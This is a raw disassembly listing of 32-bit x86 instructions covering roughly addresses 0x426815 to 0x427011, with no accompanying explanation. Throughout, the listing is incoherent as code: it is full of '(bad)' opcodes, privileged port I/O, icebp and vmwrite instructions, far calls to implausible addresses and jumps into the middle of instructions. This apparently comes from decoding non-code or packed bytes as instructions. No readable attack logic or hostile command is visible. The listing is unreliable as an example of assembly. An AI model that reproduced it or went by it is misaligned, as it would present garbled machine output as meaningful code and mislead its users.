  426815:	mov    DWORD PTR [edx],edi
  426817:	jmp    0x42683b
  426819:	and    edi,DWORD PTR [esi]
  42681b:	fbld   TBYTE PTR [ebp-0x6f1207a6]
  426821:	mov    eax,0x291cda35
  426826:	dec    esp
  426827:	in     al,0xc7
  426829:	js     0x4267f6
  42682b:	arpl   di,cx
  42682d:	mov    eax,ds:0xcdf94099
  426832:	fs pushf 
  426834:	jl     0x4267eb
  426836:	mov    dl,0x24
  426838:	pop    ebx
  426839:	mov    dh,BYTE PTR [esp+eax*8]
  42683c:	cmp    DWORD PTR ds:0xcbd34688,esp
  426842:	out    0x84,eax
  426844:	scas   eax,DWORD PTR es:[edi]
  426845:	shl    al,1
  426847:	icebp  
  426848:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  426849:	pop    ebx
  42684a:	push   ebx
  42684b:	into   
  42684c:	fisttp QWORD PTR [esi]
  42684e:	mov    cl,0xe8
  426850:	lods   al,BYTE PTR ds:[esi]
  426851:	adc    eax,0x82ef1503
  426856:	mov    esi,0xd7023c44
  42685b:	repz jne 0x4267e3
  42685e:	mov    ebp,esp
  426860:	pusha  
  426861:	mov    bl,0x13
  426863:	cmp    eax,0xa5e2a923
  426868:	pusha  
  426869:	int3   
  42686a:	push   ebp
  42686b:	nop
  42686c:	lahf   
  42686d:	popf   
  42686e:	fwait
  42686f:	inc    edi
  426870:	mov    ds:0xacfb1ea0,eax
  426875:	iret   
  426876:	push   ss
  426877:	xor    al,0x24
  426879:	mov    DWORD PTR [ebx+0x5eb63bb2],edi
  42687f:	imul   ebx,DWORD PTR [edi+0x240d6baa],0x6574728
  426889:	mov    eax,ds:0xe9abe00a
  42688e:	mov    dl,0x1e
  426890:	mov    eax,0x934ceba0
  426895:	xchg   ebx,eax
  426896:	sub    eax,DWORD PTR [ecx-0xf703fbb]
  42689c:	js     0x4268bf
  42689e:	vmwrite ecx,DWORD PTR [eax-0x3c28dfd7]
  4268a5:	ret    0x5ef5
  4268a8:	add    esi,DWORD PTR [ebp-0x13]
  4268ab:	xchg   edi,eax
  4268ac:	shl    BYTE PTR [ebx-0x7add07c5],1
  4268b2:	add    al,0x4
  4268b4:	sbb    bh,cl
  4268b6:	ds jno 0x426846
  4268b9:	adc    al,0x62
  4268bb:	mov    ds:0x999c3d09,eax
  4268c0:	xor    DWORD PTR [eax+edx*4+0x45],esp
  4268c4:	gs jne 0x426886
  4268c7:	repz push ds
  4268c9:	stos   BYTE PTR es:[edi],al
  4268ca:	enter  0xd1f2,0x9b
  4268ce:	xchg   ebx,eax
  4268cf:	enter  0x26f6,0xec
  4268d3:	push   edi
  4268d4:	mov    bl,0x75
  4268d6:	int    0x43
  4268d8:	into   
  4268d9:	sub    eax,0x11a7b7c
  4268de:	iret   
  4268df:	xor    BYTE PTR [ebx-0x66d825f2],al
  4268e5:	in     eax,0xe5
  4268e7:	xchg   esp,eax
  4268e8:	add    DWORD PTR [ecx-0x51e75b0b],ebp
  4268ee:	mov    ebx,0x779d9572
  4268f3:	(bad)  
  4268f4:	not    BYTE PTR [ebp+0x5a]
  4268f7:	pop    edi
  4268f8:	and    ebp,ecx
  4268fa:	cmp    BYTE PTR [edi-0x4b461205],bl
  426900:	ins    DWORD PTR es:[edi],dx
  426901:	jl     0x4268c9
  426903:	add    al,0xaa
  426905:	adc    BYTE PTR [eax-0x4a1dfa9b],ch
  42690b:	inc    esp
  42690c:	mov    dl,0xda
  42690e:	mov    bl,BYTE PTR [ecx-0x1b47eae0]
  426914:	fdivr  st,st(4)
  426916:	pop    ecx
  426917:	sbb    esi,DWORD PTR ds:0x9aebc054
  42691d:	mov    bl,0xc8
  42691f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  426920:	daa    
  426921:	xor    BYTE PTR [edi-0x40cf683a],dh
  426927:	je     0x4268e4
  426929:	sbb    al,0x1b
  42692b:	out    dx,al
  42692c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42692d:	enter  0xc7af,0x72
  426931:	push   edx
  426932:	inc    edi
  426933:	pop    esi
  426934:	mov    ah,0xf1
  426936:	cmp    al,0x18
  426938:	fistp  WORD PTR [edi+0x3e]
  42693b:	mov    ds:0x537b387a,al
  426940:	sub    bl,BYTE PTR [ebx+0x1f0e56ae]
  426946:	mov    ebx,0x8ddbf414
  42694b:	pusha  
  42694c:	sbb    al,0x9c
  42694e:	sbb    esp,esi
  426950:	mov    eax,ds:0xfb0dd826
  426955:	pop    es
  426956:	mov    eax,ds:0xbd7dc276
  42695b:	in     al,0x94
  42695d:	neg    BYTE PTR [eax+0x44a395dc]
  426963:	dec    esp
  426964:	gs ins BYTE PTR es:[edi],dx
  426966:	cs icebp 
  426968:	out    0xe9,eax
  42696a:	test   BYTE PTR [ebx-0x162cc6e6],0x80
  426971:	loopne 0x4269b8
  426973:	cwde   
  426974:	lds    esp,FWORD PTR [ebp-0x477de7c5]
  42697a:	les    eax,FWORD PTR [ecx-0x1ea857d]
  426980:	aas    
  426981:	leave  
  426982:	(bad)  
  426983:	loop   0x4269e8
  426985:	retf   
  426986:	pusha  
  426987:	lods   al,BYTE PTR ds:[esi]
  426988:	xor    eax,eax
  42698a:	in     eax,dx
  42698b:	repnz rcr DWORD PTR [ebp+0x3eba711b],1
  426992:	push   0x52
  426994:	mov    esp,0xebde76af
  426999:	fs mov edx,0xfee87c74
  42699f:	aas    
  4269a0:	in     eax,0x22
  4269a2:	or     ebp,esp
  4269a4:	jbe    0x4269c1
  4269a6:	push   ecx
  4269a7:	and    eax,0x8588f925
  4269ac:	mov    eax,0xb1281fba
  4269b1:	push   ss
  4269b2:	mov    esp,0x9fe5dca8
  4269b7:	mov    eax,ds:0xe925e046
  4269bc:	and    al,0xe0
  4269be:	repnz test eax,0x952f9797
  4269c4:	sbb    BYTE PTR [ebx],bh
  4269c6:	arpl   dx,di
  4269c8:	cpuid  
  4269ca:	stos   DWORD PTR es:[edi],eax
  4269cb:	and    BYTE PTR [edx+esi*1-0x6b],al
  4269cf:	hlt    
  4269d0:	popf   
  4269d1:	test   BYTE PTR ds:0xc2d91a78,bh
  4269d7:	or     esp,DWORD PTR [ecx+0x3]
  4269da:	sbb    BYTE PTR [edi-0x70936cee],al
  4269e0:	and    bh,BYTE PTR [eax+eiz*2-0x4]
  4269e4:	adc    esi,DWORD PTR [eax-0x4c]
  4269e7:	adc    BYTE PTR [esi],dl
  4269e9:	sbb    DWORD PTR [edx+0x51],edi
  4269ec:	pusha  
  4269ed:	mov    ecx,esp
  4269ef:	pop    esp
  4269f0:	loopne 0x426994
  4269f2:	stos   DWORD PTR es:[edi],eax
  4269f3:	cmp    al,0x73
  4269f5:	test   DWORD PTR [ecx+0x6e8d8aa3],esi
  4269fb:	push   0x69
  4269fd:	or     eax,0x1aeee68c
  426a02:	mov    esi,0x6ba27d60
  426a07:	sar    DWORD PTR [ebx+edi*1-0x54ef0713],cl
  426a0e:	pop    esp
  426a0f:	mov    edx,0xe52314bc
  426a14:	and    DWORD PTR [esi-0x31093c46],eax
  426a1a:	jmp    0x426a7d
  426a1c:	call   0x243519c1
  426a21:	xchg   edx,eax
  426a22:	push   ds
  426a23:	jmp    0x4269ba
  426a25:	imul   esi,DWORD PTR [ebp+0x4c60360e],0xe39bf4b8
  426a2f:	xor    ah,BYTE PTR [edx+0x1af75ba6]
  426a35:	js     0x426aaa
  426a37:	mov    edx,0x7779c2db
  426a3c:	pop    ss
  426a3d:	stc    
  426a3e:	shl    DWORD PTR [edx-0x45c2654b],cl
  426a44:	dec    eax
  426a45:	mov    ds:0x2e62babb,al
  426a4a:	jmp    DWORD PTR [edx+ebx*8]
  426a4d:	lea    edx,[ebx-0x43ca8cd3]
  426a53:	aam    0xc
  426a55:	dec    esi
  426a56:	cmp    al,0x3b
  426a59:	in     eax,0x3
  426a5b:	mov    ah,0x70
  426a5d:	mov    ah,0xb3
  426a5f:	xor    al,0xb7
  426a61:	icebp  
  426a62:	popf   
  426a63:	cwde   
  426a64:	inc    esp
  426a65:	cmp    al,0xae
  426a67:	xchg   ebp,eax
  426a68:	mov    DWORD PTR [esi-0x37da03ef],esp
  426a6e:	shr    BYTE PTR [esi],cl
  426a70:	aad    0xb7
  426a72:	retf   0x9cf2
  426a75:	setno  BYTE PTR [edx]
  426a78:	sbb    BYTE PTR [ecx-0x399346cf],bh
  426a7e:	sub    eax,0x8b9c3bc7
  426a83:	push   edx
  426a84:	push   cs
  426a85:	sbb    esi,esi
  426a87:	or     cl,dl
  426a89:	call   FWORD PTR [ebp+0x61]
  426a8c:	xlat   BYTE PTR ds:[ebx]
  426a8d:	jne    0x426a3f
  426a8f:	push   esp
  426a90:	dec    esp
  426a91:	sar    DWORD PTR [ebp+0xa],0x45
  426a95:	fst    DWORD PTR [esi-0xc]
  426a98:	imul   ecx,DWORD PTR [eax+0x4c],0xffffffc8
  426a9c:	jb     0x426a87
  426a9e:	call   0x53fac1d2
  426aa3:	aaa    
  426aa4:	inc    esp
  426aa5:	inc    edx
  426aa6:	mov    cl,0xbc
  426aa8:	jbe    0x426b05
  426aaa:	cmp    dl,dh
  426aac:	sbb    dl,BYTE PTR [edi+0xf]
  426aaf:	sbb    eax,edi
  426ab1:	dec    eax
  426ab2:	sti    
  426ab3:	imul   edx,ecx,0xffffffe7
  426ab6:	out    dx,eax
  426ab7:	inc    esp
  426ab8:	stos   DWORD PTR es:[edi],eax
  426ab9:	sahf   
  426aba:	pop    ecx
  426abb:	pop    esp
  426abc:	ins    BYTE PTR es:[edi],dx
  426abd:	fwait
  426abe:	mov    ecx,edi
  426ac0:	push   0x879e4608
  426ac5:	adc    al,0x7e
  426ac7:	lea    ebp,[ecx-0x76]
  426aca:	mov    ah,0x64
  426acc:	or     al,0x1a
  426ace:	push   0xbcd9fd0c
  426ad3:	jbe    0x426ac1
  426ad5:	loop   0x426a90
  426ad7:	and    al,dl
  426ad9:	stc    
  426ada:	mov    ebx,0x7a19a8e4
  426adf:	sub    ecx,DWORD PTR [esi]
  426ae1:	int    0x9f
  426ae3:	ss loope 0x426b23
  426ae6:	ret    
  426ae7:	adc    BYTE PTR [eax-0x28],bl
  426aea:	mov    ebp,edi
  426aec:	add    eax,0xaf04fa8
  426af1:	lock mov bl,0xa2
  426af4:	and    ecx,DWORD PTR [ecx+0x22ca71bf]
  426afa:	add    esp,edi
  426afc:	test   BYTE PTR [edi+0x68c6b31b],bl
  426b02:	mov    ah,bl
  426b04:	and    al,cl
  426b06:	add    DWORD PTR [esp+eiz*4-0x2],edx
  426b0a:	mov    ebx,0x81d20114
  426b0f:	xchg   ebx,eax
  426b10:	aad    0x78
  426b12:	and    bh,bl
  426b14:	mov    ebx,0xd4bc56e3
  426b19:	xchg   DWORD PTR [ebx-0x51],edi
  426b1c:	outs   dx,BYTE PTR ds:[esi]
  426b1d:	dec    ebp
  426b1e:	je     0x426b46
  426b20:	aaa    
  426b21:	mov    WORD PTR [esi-0xaf182d3],gs
  426b27:	lock and eax,0x8a6dab9e
  426b2d:	jo     0x426b0f
  426b2f:	xchg   esi,eax
  426b30:	jne    0x426af0
  426b32:	in     eax,0x2c
  426b34:	aam    0x82
  426b36:	mov    bh,0xc4
  426b38:	add    eax,0x557ccbf1
  426b3d:	pop    ebp
  426b3e:	repz icebp 
  426b40:	in     eax,dx
  426b41:	je     0x426af7
  426b43:	mov    ds:0x9f512919,al
  426b48:	(bad)  
  426b49:	fldcw  WORD PTR [ecx+0x3b]
  426b4c:	mov    ch,0xa8
  426b4e:	fcmovnu st,st(7)
  426b50:	jbe    0x426b7e
  426b52:	mov    bl,0x95
  426b54:	in     al,dx
  426b55:	inc    ecx
  426b56:	lahf   
  426b57:	addr16 add al,0xc1
  426b5a:	lahf   
  426b5b:	ss sbb ah,bl
  426b5e:	mov    esp,0x5bd5911c
  426b63:	dec    ebp
  426b64:	pop    ebp
  426b65:	test   eax,0x5cad42ba
  426b6a:	push   ebp
  426b6b:	xchg   ebp,eax
  426b6c:	in     eax,0xbf
  426b6e:	shl    dh,cl
  426b70:	iret   
  426b71:	adc    bh,BYTE PTR [ebx+0x1126b5dd]
  426b77:	icebp  
  426b78:	xchg   ebp,ebp
  426b7a:	and    edi,DWORD PTR [eax+0x303bd921]
  426b80:	add    DWORD PTR [edx-0x5a5ea25c],esi
  426b86:	imul   esp,DWORD PTR [esi*1-0x6bf8f045],0x71
  426b8e:	in     al,0x7e
  426b90:	jns    0x426bea
  426b92:	mov    ebp,0x562b7e04
  426b97:	out    0xd9,al
  426b99:	adc    al,0x6d
  426b9b:	mov    eax,ebx
  426b9d:	mov    dh,0xbb
  426b9f:	int3   
  426ba0:	bswap  ebp
  426ba2:	jge    0x426c18
  426ba4:	mov    ss,WORD PTR [esi-0x41]
  426ba7:	add    al,0xed
  426ba9:	scas   al,BYTE PTR es:[edi]
  426baa:	hlt    
  426bab:	inc    ebp
  426bac:	es sub esp,esi
  426baf:	popa   
  426bb0:	cmp    DWORD PTR [ebp+0x283b8ae9],ebx
  426bb6:	call   0x14bb901a
  426bbb:	jl     0x426b53
  426bbd:	mov    ebx,0xfe5d7699
  426bc2:	xchg   edx,eax
  426bc3:	or     dh,BYTE PTR [esi-0x63]
  426bc6:	add    BYTE PTR [ebx],ah
  426bc8:	ret    
  426bc9:	mov    DWORD PTR [esi+0x3811be1e],edi
  426bcf:	out    dx,al
  426bd0:	xchg   ebx,eax
  426bd1:	iret   
  426bd2:	mov    cl,0xa4
  426bd4:	mov    ecx,0x45581383
  426bd9:	aad    0xe9
  426bdb:	out    dx,eax
  426bdc:	jno    0x426ba5
  426bde:	mov    DWORD PTR [ecx-0x6443a120],ecx
  426be4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  426be5:	mov    al,0xaa
  426be7:	jns    0x426c3e
  426be9:	test   DWORD PTR ds:0xda0ef7e8,esi
  426bef:	out    dx,al
  426bf0:	shr    DWORD PTR [ebp+0x3e86133b],cl
  426bf6:	adc    eax,0xb9e65b55
  426bfb:	add    esp,DWORD PTR [ebx]
  426bfd:	jmp    0xdcf08bd6
  426c02:	(bad)  
  426c03:	fst    st(6)
  426c05:	js     0x426c04
  426c07:	test   al,0xf9
  426c09:	mov    bh,0x5d
  426c0c:	fldcw  WORD PTR [esi+0x42]
  426c0f:	xchg   esp,eax
  426c10:	icebp  
  426c11:	sub    BYTE PTR [ebx-0x1c96ca0c],0xe5
  426c18:	adc    al,0x1d
  426c1a:	push   0xffffffc2
  426c1c:	and    ecx,ebx
  426c1e:	jge    0x426bc6
  426c20:	mov    dh,0xc5
  426c22:	ficomp DWORD PTR [ebx]
  426c24:	mov    BYTE PTR [ecx+0xd98209b],ah
  426c2a:	imul   ebx,DWORD PTR [edx-0x13d0fe36],0x781659b
  426c34:	aad    0x4e
  426c36:	test   esi,ebp
  426c38:	xchg   DWORD PTR [ecx-0xd6a2a09],eax
  426c3e:	sub    dl,ch
  426c40:	sbb    edx,edx
  426c42:	xchg   ecx,eax
  426c43:	out    0x6a,al
  426c45:	mov    eax,ds:0x7090cacb
  426c4a:	gs xchg ecx,eax
  426c4c:	cmp    al,0x80
  426c4e:	dec    esp
  426c4f:	or     eax,0xa4cfd858
  426c54:	sub    DWORD PTR [ecx],esp
  426c56:	adc    edi,DWORD PTR [ecx+0x4446c565]
  426c5c:	mov    dh,0xdd
  426c5e:	add    al,0x12
  426c60:	adc    eax,0x390c9c4
  426c65:	js     0x426c41
  426c67:	mov    WORD PTR [esi-0x2f],cs
  426c6a:	mov    edi,0xcfe77b68
  426c6f:	adc    al,0xa
  426c71:	and    eax,0x8d3bc10f
  426c76:	mov    esp,0xd22f413b
  426c7b:	mov    al,ds:0x92bacec5
  426c80:	sbb    ecx,DWORD PTR [ecx-0x3bc9951c]
  426c86:	ror    BYTE PTR [eax],0x11
  426c89:	xchg   BYTE PTR [ecx+ecx*2],bl
  426c8c:	push   cs
  426c8d:	icebp  
  426c8e:	cmp    BYTE PTR [eax+esi*2],cl
  426c91:	adc    eax,0x1cf2eee3
  426c96:	retf   
  426c97:	(bad)  
  426c98:	into   
  426c99:	cld    
  426c9a:	mov    eax,ds:0x2be70dd3
  426c9f:	out    0xf4,eax
  426ca1:	mov    dl,0xd9
  426ca3:	jns    0x426cbb
  426ca5:	div    DWORD PTR [ecx+ebx*8]
  426ca8:	push   ss
  426ca9:	sbb    edx,eax
  426cab:	add    ch,BYTE PTR ss:[ebx+0x7a]
  426caf:	mul    BYTE PTR [edx-0x7c]
  426cb2:	mov    ebx,0x374aa904
  426cb7:	cmc    
  426cb8:	lds    edi,FWORD PTR [esi+0x1f30ec94]
  426cbe:	jb     0x426ccf
  426cc0:	and    cl,BYTE PTR [ecx]
  426cc2:	retw   
  426cc4:	stos   BYTE PTR es:[edi],al
  426cc5:	xlat   BYTE PTR ds:[ebx]
  426cc6:	loop   0x426d0a
  426cc8:	stos   DWORD PTR es:[edi],eax
  426cc9:	test   DWORD PTR [eax+eiz*2+0x72c12821],ebp
  426cd0:	fisttp QWORD PTR [ebp+0x92734b5]
  426cd6:	add    BYTE PTR [ebx+0x4d9c35ff],al
  426cdc:	xlat   BYTE PTR ds:[ebx]
  426cdd:	sbb    dh,bh
  426cdf:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  426ce0:	push   ebp
  426ce1:	fwait
  426ce2:	jnp    0x426c6c
  426ce4:	retf   
  426ce5:	ret    
  426ce6:	mov    cl,0x81
  426ce8:	daa    
  426ce9:	add    BYTE PTR [ecx],al
  426ceb:	je     0x426caa
  426ced:	jg     0x426ca3
  426cef:	add    al,0xac
  426cf1:	sbb    bl,cl
  426cf3:	push   eax
  426cf4:	xchg   ebp,eax
  426cf5:	dec    ebx
  426cf6:	cmp    eax,0xe1cae9ef
  426cfb:	(bad)  
  426cfc:	sbb    DWORD PTR [ecx-0x35],ebx
  426cff:	repz scas eax,DWORD PTR es:[edi]
  426d01:	sub    eax,0xa9796c11
  426d06:	imul   edi,DWORD PTR [esi-0x3],0xffffffa9
  426d0a:	mov    esp,DWORD PTR [edx+ecx*2]
  426d0d:	pop    esp
  426d0e:	mov    edx,DWORD PTR [ebx+0x10c3191e]
  426d14:	pop    eax
  426d15:	lock outs dx,DWORD PTR ds:[esi]
  426d17:	mov    ebp,0x6cab9985
  426d1c:	call   0x9062df65
  426d21:	cmp    bl,bh
  426d23:	and    al,BYTE PTR [ecx-0x12ab416b]
  426d29:	retf   0xced4
  426d2c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  426d2d:	mov    edi,?
  426d2f:	adc    cl,BYTE PTR [edx+ebx*8]
  426d32:	dec    eax
  426d33:	les    ebp,FWORD PTR [eax]
  426d35:	mov    bl,0xc3
  426d37:	cmp    BYTE PTR [ebx+0x7e],0x39
  426d3b:	aas    
  426d3c:	fiadd  DWORD PTR [edi-0xd]
  426d3f:	fcom   QWORD PTR ds:0x51e701c7
  426d45:	push   cs
  426d46:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  426d47:	pop    ds
  426d48:	scas   al,BYTE PTR es:[edi]
  426d49:	and    BYTE PTR [eax-0x5bf33d60],bl
  426d4f:	mov    eax,0x10340898
  426d54:	fdiv   QWORD PTR ds:0x5a4d7b3
  426d5a:	push   esi
  426d5b:	ror    DWORD PTR [ebx-0x39],0x80
  426d5f:	data16 add BYTE PTR [edx],dh
  426d62:	mov    ecx,0x726b80b4
  426d67:	not    DWORD PTR [esi]
  426d69:	dec    esi
  426d6a:	enter  0xc644,0xbd
  426d6e:	xchg   ebx,eax
  426d6f:	call   0xa1a8:0x67bba6b8
  426d76:	sbb    edi,0x9bc063fc
  426d7c:	or     bl,ch
  426d7e:	mov    edi,0x9ed399f4
  426d83:	ret    0xd5b9
  426d86:	xlat   BYTE PTR ds:[ebx]
  426d87:	shr    DWORD PTR [edx*1-0x38ae1b4d],0x34
  426d8f:	shl    ebp,cl
  426d91:	daa    
  426d92:	mov    eax,0x18ba1ac4
  426d97:	fs imul eax,esp,0x829d6e0d
  426d9e:	xchg   edx,eax
  426d9f:	clc    
  426da0:	or     al,0x7d
  426da2:	retf   
  426da3:	inc    edi
  426da4:	pop    ebx
  426da5:	jmp    0x426d44
  426da7:	aad    0x43
  426da9:	add    eax,0xd70ceb0d
  426dae:	or     eax,DWORD PTR [eax-0x30e7c1a7]
  426db4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  426db5:	xchg   ebp,eax
  426db6:	nop
  426db7:	stc    
  426db8:	inc    esi
  426db9:	cmp    DWORD PTR [edi],esp
  426dbb:	sar    BYTE PTR [eax-0x2ab0595f],0x79
  426dc2:	hlt    
  426dc3:	xlat   BYTE PTR ds:[ebx]
  426dc4:	or     esi,edi
  426dc6:	shr    DWORD PTR es:[edi+0x37],1
  426dca:	mov    dh,0xeb
  426dcc:	adc    bl,BYTE PTR [esi-0xd]
  426dcf:	push   eax
  426dd0:	inc    ebp
  426dd1:	mov    bl,0x85
  426dd3:	out    dx,eax
  426dd4:	fld    QWORD PTR [ebp+0x6c]
  426dd7:	add    eax,0x82c83924
  426ddc:	mov    ebx,0x66c1f79c
  426de1:	out    dx,al
  426de2:	fild   DWORD PTR [edx]
  426de4:	or     al,0xfe
  426de6:	clc    
  426de7:	xor    esp,DWORD PTR [ecx]
  426de9:	leave  
  426dea:	shl    ch,1
  426dec:	fisubr DWORD PTR [edx]
  426dee:	dec    esi
  426def:	adc    dl,BYTE PTR [edi]
  426df1:	popa   
  426df2:	xor    bl,dl
  426df4:	sar    DWORD PTR ds:0xe256fd9f,cl
  426dfa:	or     DWORD PTR [edx],ebx
  426dfc:	jo     0x426dd0
  426dfe:	mov    esp,0x329c517f
  426e03:	rcr    dh,1
  426e05:	push   ebp
  426e06:	mov    edi,0x55d408a4
  426e0b:	fnstsw WORD PTR [ecx-0x62899b5c]
  426e11:	xchg   ebp,eax
  426e12:	mov    bh,0x94
  426e14:	bound  eax,QWORD PTR [edi]
  426e16:	pop    ebp
  426e17:	dec    edx
  426e18:	es int 0xb1
  426e1b:	and    al,0xe1
  426e1d:	xchg   edi,eax
  426e1e:	add    BYTE PTR [eax+0x4d],bl
  426e21:	push   edx
  426e22:	repz pop ebp
  426e24:	frstor [ecx-0x785c7de5]
  426e2a:	repz sbb al,0x7
  426e2d:	xor    esp,eax
  426e2f:	pop    ebx
  426e30:	mov    ecx,0x9144bca6
  426e35:	fwait
  426e36:	repz loope 0x426e4d
  426e39:	test   ah,bh
  426e3b:	xchg   BYTE PTR cs:[ecx-0x15a7fb94],cl
  426e42:	mov    edx,0x7179204a
  426e47:	lahf   
  426e48:	icebp  
  426e49:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  426e4a:	ins    BYTE PTR es:[edi],dx
  426e4b:	popa   
  426e4c:	inc    ebx
  426e4d:	pushf  
  426e4e:	(bad)  [ebx]
  426e50:	repnz test ecx,0x7eb27ae6
  426e57:	jnp    0x426ecd
  426e59:	bound  esi,QWORD PTR [esi+0x75983ea4]
  426e5f:	push   ss
  426e60:	test   DWORD PTR [esi],eax
  426e62:	adc    ebp,ebx
  426e64:	imul   esp,DWORD PTR [bx+0x75],0xf07c7717
  426e6c:	and    bh,BYTE PTR [edi]
  426e6e:	lods   al,BYTE PTR ds:[esi]
  426e6f:	or     BYTE PTR [edi],cl
  426e71:	xor    eax,0x427dff65
  426e76:	pop    esp
  426e77:	call   0xf924cec3
  426e7c:	gs dec ecx
  426e7e:	aas    
  426e7f:	lock lods al,BYTE PTR ds:[esi]
  426e81:	mov    edx,ds
  426e83:	ret    0x8918
  426e86:	in     al,dx
  426e87:	jb     0x426e97
  426e89:	test   dl,ah
  426e8b:	lahf   
  426e8c:	push   ecx
  426e8d:	lahf   
  426e8e:	imul   ecx,DWORD PTR [edi-0x34],0xffffff82
  426e92:	es push 0xed82502
  426e98:	jns    0x426edb
  426e9a:	cs xor eax,0xc0515b22
  426ea0:	je     0x426e3f
  426ea2:	mov    ebx,0xdf0fed35
  426ea7:	mov    DWORD PTR [esi-0x3eba95f5],edx
  426ead:	ds mov ecx,0xd871e354
  426eb3:	inc    esp
  426eb4:	aad    0x3b
  426eb6:	popf   
  426eb7:	repz cmp DWORD PTR [ebp+0x491fcf8e],eax
  426ebe:	push   ebx
  426ebf:	pop    ebx
  426ec0:	push   cs
  426ec1:	stos   BYTE PTR es:[edi],al
  426ec2:	pop    edx
  426ec3:	std    
  426ec4:	dec    esi
  426ec5:	mov    cl,0xfb
  426ec7:	enter  0x9ded,0x9e
  426ecb:	repz mov al,ds:0x18a70e9f
  426ed1:	sub    edi,edi
  426ed3:	mov    al,ds:0xb443ef05
  426ed8:	sbb    esp,DWORD PTR [ebx+ebp*8-0x4cf634bf]
  426edf:	mov    edx,DWORD PTR [esi-0x2b]
  426ee2:	fnstsw WORD PTR [ebp+0x33]
  426ee5:	je     0x426e98
  426ee7:	je     0x426f49
  426ee9:	sti    
  426eea:	ror    DWORD PTR [eax-0x6b],1
  426eed:	lods   al,BYTE PTR ds:[esi]
  426eee:	push   ebp
  426eef:	lock or BYTE PTR [edx],al
  426ef2:	sti    
  426ef3:	int3   
  426ef4:	(bad)  
  426ef7:	(bad)  
  426ef8:	stos   BYTE PTR es:[edi],al
  426ef9:	mov    BYTE PTR [esi-0xf],ch
  426efc:	pop    es
  426efd:	pop    ds
  426efe:	div    ecx
  426f00:	(bad)  
  426f01:	jnp    0x426e92
  426f03:	pop    ecx
  426f04:	sbb    al,0x91
  426f06:	stc    
  426f07:	adc    al,dl
  426f09:	cmp    al,0xf5
  426f0b:	cld    
  426f0c:	pop    ecx
  426f0d:	sbb    DWORD PTR ds:0x4b4d395c,eax
  426f13:	dec    esp
  426f14:	lods   eax,DWORD PTR ds:[esi]
  426f15:	cdq    
  426f16:	mov    edx,0x3ba74d3c
  426f1b:	imul   esp,DWORD PTR [esp+edx*4-0x7d592049],0x7f
  426f23:	or     ebx,DWORD PTR [edx]
  426f25:	scas   al,BYTE PTR es:[edi]
  426f26:	mov    edi,0x69d369f4
  426f2b:	mov    ds:0x5ca142f6,al
  426f30:	add    cl,BYTE PTR [esi-0x109c0a01]
  426f36:	mov    dl,0x3a
  426f38:	mov    al,0xfc
  426f3a:	arpl   WORD PTR [edi-0x13],cx
  426f3d:	add    dh,cl
  426f3f:	repnz cmp al,0xe1
  426f42:	out    dx,al
  426f43:	mov    ebx,0xe807aec5
  426f48:	cmp    bh,BYTE PTR [esi+eax*4]
  426f4b:	imul   ebx,DWORD PTR [esp+eax*8],0x6bfe4583
  426f52:	mov    bl,0x54
  426f54:	rol    esi,cl
  426f56:	dec    eax
  426f57:	fdivr  st,st(5)
  426f59:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  426f5a:	stos   DWORD PTR es:[edi],eax
  426f5b:	lds    ebp,FWORD PTR [edi-0x5]
  426f5e:	bound  edx,QWORD PTR [ebx-0x67e394d7]
  426f64:	dec    ecx
  426f65:	adc    BYTE PTR [eax+0x1b57bb04],dh
  426f6b:	es in  eax,0x6b
  426f6e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  426f6f:	out    dx,eax
  426f70:	dec    esi
  426f71:	shr    DWORD PTR [edx],cl
  426f73:	loop   0x426f9f
  426f75:	jns    0x426f62
  426f77:	mov    DWORD PTR [ecx],edx
  426f79:	cmp    DWORD PTR [edx+0x3c36180b],0xcf57d588
  426f83:	clc    
  426f84:	pushf  
  426f85:	outs   dx,BYTE PTR ds:[esi]
  426f86:	pop    eax
  426f87:	adc    DWORD PTR [edi+0x1],esp
  426f8a:	and    ch,al
  426f8c:	leave  
  426f8d:	xor    BYTE PTR [eax+0x1555db34],bh
  426f93:	in     eax,dx
  426f94:	pop    eax
  426f95:	lahf   
  426f96:	mov    ss,eax
  426f98:	push   ebp
  426f99:	int3   
  426f9a:	push   ss
  426f9b:	out    dx,al
  426f9c:	cs gs retf 
  426f9f:	xchg   edi,eax
  426fa0:	sahf   
  426fa1:	mov    BYTE PTR [esi+0x25aa8e54],dh
  426fa7:	js     0x426fde
  426fa9:	cwde   
  426faa:	fsub   st,st(5)
  426fac:	imul   eax,ebp,0x387f2d71
  426fb2:	sbb    DWORD PTR [ebp+0x54bc6220],ecx
  426fb8:	cwde   
  426fb9:	jnp    0x426f65
  426fbb:	pop    esi
  426fbc:	mov    ebx,ecx
  426fbe:	(bad)  
  426fbf:	stos   DWORD PTR es:[edi],eax
  426fc0:	cs retf 0xb4ba
  426fc4:	dec    edi
  426fc5:	dec    esp
  426fc6:	clc    
  426fc7:	ja     0x426ff1
  426fc9:	cmp    DWORD PTR [ecx],ecx
  426fcb:	pushf  
  426fcc:	push   esp
  426fcd:	ds std 
  426fcf:	test   DWORD PTR [esi+edx*1-0x40],ebx
  426fd3:	imul   eax,ebp,0x68f44571
  426fd9:	fstp   st(1)
  426fdb:	cld    
  426fdc:	in     eax,0x0
  426fde:	lds    ecx,FWORD PTR [ebx+0x64188953]
  426fe4:	dec    ebx
  426fe5:	xchg   ecx,eax
  426fe6:	(bad)  
  426fe7:	repz and DWORD PTR [ebx+0x1b65e8d1],ecx
  426fee:	je     0x426fdd
  426ff0:	(bad)  
  426ff1:	xchg   esp,eax
  426ff2:	in     al,0xa0
  426ff4:	sbb    ch,BYTE PTR [ecx]
  426ff6:	push   ds
  426ff7:	repz daa 
  426ff9:	fdivrp st(4),st
  426ffb:	pushf  
  426ffc:	dec    ecx
  426ffd:	cmp    DWORD PTR [edx+0x6ba83372],ebp
  427003:	call   0x5e598d41
  427008:	dec    esp
  427009:	xor    BYTE PTR [edi-0x5b],bl
  42700c:	ret    
  42700d:	aas    
  42700e:	cwde   
  42700f:	in     eax,0x19
  427011:	sbb    al,0xf8
